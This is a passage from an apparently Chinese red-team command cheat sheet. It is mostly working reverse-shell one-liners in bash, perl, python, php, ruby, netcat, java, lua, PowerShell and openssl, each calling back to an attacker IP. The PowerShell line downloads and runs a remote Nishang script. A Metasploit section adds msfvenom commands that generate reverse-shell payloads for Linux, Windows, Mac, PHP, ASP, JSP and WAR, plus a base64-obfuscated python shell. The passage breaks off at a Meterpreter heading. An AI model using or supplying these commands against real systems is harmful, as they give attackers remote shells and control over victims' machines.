    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>nc -lvvp 4444</code></pre><h2 id="bashhttpsbookshentoushitopmanualredteam_commandhtmlbash" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#bash"target="_blank" rel="external nofollow noopener noreferrer">bash</a></span>
  <a href="#bashhttpsbookshentoushitopmanualredteam_commandhtmlbash" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>bash -i &gt;&amp; /dev/tcp/172.16.1.130/4444 0&gt;&amp;1
exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></pre><h2 id="perlhttpsbookshentoushitopmanualredteam_commandhtmlperl" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#perl"target="_blank" rel="external nofollow noopener noreferrer">perl</a></span>
  <a href="#perlhttpsbookshentoushitopmanualredteam_commandhtmlperl" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</code></pre><h2 id="pythonhttpsbookshentoushitopmanualredteam_commandhtmlpython" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#python"target="_blank" rel="external nofollow noopener noreferrer">python</a></span>
  <a href="#pythonhttpsbookshentoushitopmanualredteam_commandhtmlpython" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.31.41&#34;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</code></pre><h2 id="phphttpsbookshentoushitopmanualredteam_commandhtmlphp" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#php"target="_blank" rel="external nofollow noopener noreferrer">php</a></span>
  <a href="#phphttpsbookshentoushitopmanualredteam_commandhtmlphp" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</code></pre><h2 id="rubyhttpsbookshentoushitopmanualredteam_commandhtmlruby" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#ruby"target="_blank" rel="external nofollow noopener noreferrer">ruby</a></span>
  <a href="#rubyhttpsbookshentoushitopmanualredteam_commandhtmlruby" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</code></pre><h2 id="nchttpsbookshentoushitopmanualredteam_commandhtmlnc-1" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#nc-1"target="_blank" rel="external nofollow noopener noreferrer">nc</a></span>
  <a href="#nchttpsbookshentoushitopmanualredteam_commandhtmlnc-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</code></pre><h2 id="javahttpsbookshentoushitopmanualredteam_commandhtmljava" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#java"target="_blank" rel="external nofollow noopener noreferrer">java</a></span>
  <a href="#javahttpsbookshentoushitopmanualredteam_commandhtmljava" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>r = Runtime.getRuntime()
p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[])
p.waitFor()</code></pre><h2 id="luahttpsbookshentoushitopmanualredteam_commandhtmllua" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#lua"target="_blank" rel="external nofollow noopener noreferrer">lua</a></span>
  <a href="#luahttpsbookshentoushitopmanualredteam_commandhtmllua" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>lua -e &#34;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&#34;</code></pre><h2 id="powershellhttpsbookshentoushitopmanualredteam_commandhtmlpowershell" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#powershell"target="_blank" rel="external nofollow noopener noreferrer">powershell</a></span>
  <a href="#powershellhttpsbookshentoushitopmanualredteam_commandhtmlpowershell" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444</code></pre><h2 id="加密shellhttpsbookshentoushitopmanualredteam_commandhtml加密shell" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%8a%a0%e5%af%86shell"target="_blank" rel="external nofollow noopener noreferrer">加密shell</a></span>
  <a href="#%e5%8a%a0%e5%af%86shellhttpsbookshentoushitopmanualredteam_commandhtml%e5%8a%a0%e5%af%86shell" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.0.100:2333 &gt; /tmp/s; rm /tmp/s</code></pre><h1 id="msf大全httpsbookshentoushitopmanualredteam_commandhtmlmsf大全" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#msf%e5%a4%a7%e5%85%a8"target="_blank" rel="external nofollow noopener noreferrer">msf大全</a></span>
  <a href="#msf%e5%a4%a7%e5%85%a8httpsbookshentoushitopmanualredteam_commandhtmlmsf%e5%a4%a7%e5%85%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>到处抄的</p>
<p><a href="https://xz.aliyun.com/t/2536"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/2536</a></p>
<p><a href="https://www.freebuf.com/articles/web/270456.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/articles/web/270456.html</a></p>
<p><a href="https://saucer-man.com/information_security/79.html"target="_blank" rel="external nofollow noopener noreferrer">https://saucer-man.com/information_security/79.html</a></p>
<p><a href="https://www.anquanke.com/post/id/235631"target="_blank" rel="external nofollow noopener noreferrer">https://www.anquanke.com/post/id/235631</a></p>
<p><a href="https://www.anquanke.com/post/id/164525"target="_blank" rel="external nofollow noopener noreferrer">https://www.anquanke.com/post/id/164525</a></p>
<h2 id="安装httpsbookshentoushitopmanualredteam_commandhtml安装" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%ae%89%e8%a3%85"target="_blank" rel="external nofollow noopener noreferrer">安装</a></span>
  <a href="#%e5%ae%89%e8%a3%85httpsbookshentoushitopmanualredteam_commandhtml%e5%ae%89%e8%a3%85" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>安装</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 安装</span>
</span></span><span style="display:flex;"><span>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall <span style="color:#ff636f">&amp;&amp;</span> chmod <span style="color:#a6be9d">755</span> msfinstall <span style="color:#ff636f">&amp;&amp;</span> ./msfinstall
</span></span><span style="display:flex;"><span>安装目录 
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># /opt/metasploit-framework/embedded/framework/</span></span></span></code></pre></div><p>payload生成</p>
<p>Linux</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>反向连接：
</span></span><span style="display:flex;"><span>msfvenom -p linux/x64/meterpreter/reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf
</span></span><span style="display:flex;"><span>正向连接：
</span></span><span style="display:flex;"><span>msfvenom -p linux/x64/meterpreter/bind_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Target IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span></span></code></pre></div><p>Windows</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span></span></code></pre></div><p>Mac</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p osx/x86/shell_reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span></span></code></pre></div><p>PHP</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p php/meterpreter_reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
</span></span><span style="display:flex;"><span>cat shell.php | pbcopy <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#39;&lt;?php &#39;</span> | tr -d <span style="color:#a6be9d">&#39;\n&#39;</span> &gt; shell.php <span style="color:#ff636f">&amp;&amp;</span> pbpaste &gt;&gt; shell.php</span></span></code></pre></div><p>ASP</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span></span></code></pre></div><p>JSP</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p java/jsp_shell_reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span></span></code></pre></div><p>WAR</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p java/jsp_shell_reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span></span></code></pre></div><p>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php shell.php</span></span></code></pre></div><p>3.脚本shell</p>
<p>Python</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p cmd/unix/reverse_python <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span></span></code></pre></div><p>Bash</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p cmd/unix/reverse_bash <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span></span></code></pre></div><p>Perl</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p cmd/unix/reverse_perl <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span></span></code></pre></div><p>执行方式：复制shell.py中的内容在linux命令行下执行：</p>
<pre tabindex="0"><code>python -c &#34;exec(&#39;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#39;.decode(&#39;base64&#39;))&#34;</code></pre><p>4.shellcode Linux Based Shellcode</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p linux/x86/meterpreter/reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span></span></code></pre></div><p>Windows Based Shellcode</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span></span></code></pre></div><p>Mac Based Shellcode</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p osx/x86/shell_reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>&lt;Your IP Address&gt; <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span>&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span></span></code></pre></div><h2 id="meterpreter基本命令httpsbookshentoushitopmanualredteam_commandhtmlmeterpreter基本命令" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#meterpreter%e5%9f%ba%e6%9c%ac%e5%91%bd%e4%bb%a4"target="_blank" rel="external nofollow noopener noreferrer">Meterpreter基本命令</a></span>
